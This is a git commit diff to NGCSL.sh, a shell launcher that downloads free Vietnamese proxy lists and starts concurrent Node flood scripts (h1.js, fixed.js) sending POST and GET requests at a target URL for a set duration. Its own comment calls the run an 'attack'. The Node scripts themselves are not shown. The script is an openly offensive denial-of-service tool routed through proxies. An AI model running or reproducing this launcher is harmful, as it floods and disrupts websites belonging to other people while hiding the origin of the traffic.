97dba5616bf836455d9e2661ff6b92dda3e1c4e8
hackerlove123 <149338972+hackerlove123@users.noreply.github.com>
2025-05-27 16:22:17 +0700

    hehe

--- NGCSL.sh
+++ NGCSL.sh
@@ -4,7 +4,6 @@
 URL=$1
 TIME=$2
 
-# Xóa file proxy cũ và tải proxy mới
 > live.txt
 for t in http https; do
   curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=9999&protocol=$t" >> live.txt
@@ -12,11 +11,11 @@ done
 
 sort -u live.txt -o live.txt
 
-# Chạy các tiến trình node đồng thời, bật chế độ ignore lỗi (|| true)
+# Start Node scripts
 for m in POST GET; do
   node h1.js $m $URL live.txt $TIME 999 10 randomstring=true || true &
   node fixed.js $URL $TIME 1 1 hihi.txt --verify true || true &
 done
-
-# Đợi tất cả tiến trình node chạy xong trước khi exit
 wait
+# Đợi đúng thời gian attack trước khi exit
+sleep $TIME
